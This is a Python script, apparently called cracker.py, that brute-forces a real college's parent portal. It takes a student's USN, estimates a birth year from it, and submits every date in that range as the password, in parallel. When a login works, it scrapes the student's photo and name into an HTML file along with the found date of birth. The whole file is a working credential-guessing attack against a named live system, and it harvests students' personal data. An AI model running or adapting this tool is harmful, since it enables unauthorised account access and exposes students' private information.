import requests
import datetime
import os
import aiohttp
import asyncio
import typer
from rich.progress import Progress
import bs4


def getcookies(session):
    return session.get("https://sims.sit.ac.in/parents/index.php").cookies


def scrape(text):
    soup = bs4.BeautifulSoup(text, "lxml")
    main_data = soup.div(
        attrs={"class": "uk-card uk-card-body cn-stu-data cn-stu-data1"})[0]
    return "https://sims.sit.ac.in/parents/" + main_data.img.get("src"), main_data.h3.text


def addzero(number, digit=2):
    number = str(number)
    while len(number) != digit:
        number = "0" + number
    return number


def check_is_the_page(html_str):
    return html_str.find("<option") == -1


def addtohtml(html_data):
    return f"""\n<div style="border: 8px solid;padding-left: 25px;padding-top: 25px;">   <img src="{html_data[2]}">   <h1>{html_data[0]}</h1>  <h2>{html_data[1]}</h2>  <h2>{html_data[3]}</h2>  </div>   \n"""


headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "sec-ch-ua": '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
    "sec-ch-ua-mobile": "?0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://sit.ac.in",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",

}


class GenerateDate:
    def __init__(self, start: datetime.date, end: datetime.date, usn: str):
        self.start = start
        self.end = end
        self.number_days = self.end - self.start
        self.offset = datetime.timedelta(days=1)
        self.data = f"username={usn}&remember=No&option=com_user&task=login&return=%EF%BF%BDw%5E%C6%98i&return=&eb520bba94b39cc00ecb41b82936aceb=1"

    def __iter__(self):
        return self

    def __next__(self):
        if self.start < self.end:
            self.start = self.start + self.offset
            return (
                f"dd={addzero(self.start.day)}&mm={addzero(self.start.month)}&yyyy={self.start.year}&passwd={self.start.strftime('%Y-%m-%d')}&"
                + self.data
            )
        else:
            raise StopIteration


class Cracker_linear():
    def __init__(self, usn: str, start_date: datetime.date, end_date: datetime.date = datetime.date.today()):
        self.start = start_date-datetime.timedelta(1)
        self.end = end_date
        self.usn = usn
        self.user_data = GenerateDate(self.start, self.end, self.usn)
        self.session = requests.Session()

    def cracker(self):
        with Progress(refresh_per_second=25, speed_estimate_period=10) as progress:
            task1 = progress.add_task(
                f"Checking Status...\nUSN:{self.usn} from -> {(self.start+datetime.timedelta(1)).strftime('%d/%m/%Y')} to -> {self.end.strftime('%d/%m/%Y')}", total=self.user_data.number_days.days)

            for user in self.user_data:

                rv = self.session.post(
                    "https://sims.sit.ac.in/parents/index.php", data=user, headers=headers).text

                if rv.find("<option") == -1:

                    scrp_temp = scrape(rv)
                    write_to_file(
                        addtohtml([self.usn, user[29:39], scrp_temp[0], scrp_temp[1]]))

                    progress.update(task1, completed=1, visible=0)

                    print(scrp_temp[1], user[29:39],
                          scrp_temp[0], " (added to usn.html)")
                    return (self.usn, user[29:39])

                progress.update(
                    task1, advance=1, description=f"{self.usn} [red]-->[/red] {user[3:5]}/{user[9:11]}/{user[17:21]}")

            print(
                "No match", f"{self.usn} --> {(self.start + datetime.timedelta(1) ).strftime('%d/%m/%Y')} to {self.end.strftime('%d/%m/%Y')} ")
            progress.update(task1, completed=1, visible=0)

    def start_crack(self):
        try:
            self.cracker()
        except KeyboardInterrupt:
            pass


def write_to_file(data: str):
    if os.path.exists("usn.html") and os.stat("usn.html").st_size != 0:
        file = open("usn.html", "a")
    else:
        file = open("usn.html", "w")
        file.write("""<body style="display: flex;flex-direction: column;">""")
    file.write(data)
    file.close()


class Cracker_asyn():
    def __init__(self, usn: str, start_date: datetime.date, end_date: datetime.date = datetime.date.today(), state: int = 5, progress_bar=True):
        self.start = start_date-datetime.timedelta(1)
        self.end = end_date
        self.usn = usn
        self.user_data = GenerateDate(self.start, self.end, self.usn)
        self.state = state
        self.session = requests.Session()

    async def cracker_asyn(self):
        self.tasks = []
        self.progress = Progress()
        self.b = self.progress.add_task(total=self.user_data.number_days.days, visible=0,
                                        description=f"Checking Status...\nUSN:{self.usn} from -> {self.start.strftime('%Y-%m-%d')} to -> {self.end.strftime('%Y-%m-%d')}")
        self.found = 0
        async with aiohttp.ClientSession(headers=headers, cookies=getcookies(requests)) as session:
            with self.progress as _:
                for _ in range(0, self.state):
                    self.tasks.append(self.cracker_asyn_fetch(session))
            await asyncio.gather(*self.tasks)

    async def cracker_asyn_fetch(self, session: aiohttp.ClientSession):
        self.progress.update(self.b, visible=1)
        with self.progress as p:
            for user in self.user_data:
                if self.found:
                    return

                async with session.post("https://sims.sit.ac.in/parents/index.php", data=user) as response:
                    rv = str(await response.read())
                    p.update(
                        self.b, advance=1, description=f"{self.usn} [red]-->[/red] {user[3:5]}/{user[9:11]}/{user[17:21]}")

                    if rv.find("<option") == -1:
                        scrp_temp = scrape(rv)
                        write_to_file(
                            addtohtml([self.usn, user[29:39], scrp_temp[0], scrp_temp[1]]))

                        p.update(self.b, completed=1, visible=0)
                        print(scrp_temp[1], user[29:39],
                              scrp_temp[0], " (added to usn.html)")
                        self.found = 1
                        return (self.usn, user[29:39])

        if not self.found:
            print(
                "No match", f"{self.usn} --> {(self.start + datetime.timedelta(1) ).strftime('%d/%m/%Y')} to {self.end.strftime('%d/%m/%Y')} ")
            p.update(self.b, completed=1, visible=0)

    def start_crack(self):
        try:
            asyncio.run(self.cracker_asyn())
        except KeyboardInterrupt:
            pass


def check_date(t, dates: str):
    data = dates.split("/")
    if len(data) != 3:
        t.echo("Wrong date format. formate is dd/mm/yyyy")

    try:
        return datetime.date(int(data[2]), int(data[1]), int(data[0]))

    except Exception as e:
        t.echo(f"Invalid date {dates} {e}")


def main(type: str = "p", usn: str = typer.Option(..., prompt=True), start: str = None, end: str = None):
    """It send the requests near at same time but wait for results ,some time faster recommended 

    Args: \n
        type (p/l) : l for linear search , p for parallel search ,default is parallel \n
        usn (str): usn to find the date of birth \n
        start_date (str): at which date to start checking \n
        end_date (str): at which date to end.

        ex:
            python3 cracker.py --type f --usn { usn } --start [start_date] --end [end_date]
    """
    if start is None:
        start = "01/01/20"+str(addzero(int(usn[3:5])-18))

    start = check_date(typer, start)

    if end is None:
        end = "01/01/20"+str(addzero(int(usn[3:5])-17))

    end = check_date(typer, end)

    if end < start:
        typer.echo("Invalid date provided")
    if type == 'p':
        Cracker_asyn(usn.upper(), start, end).start_crack()
    else:
        Cracker_linear(usn.upper(), start, end).start_crack()


if __name__ == "__main__":
    typer.run(main)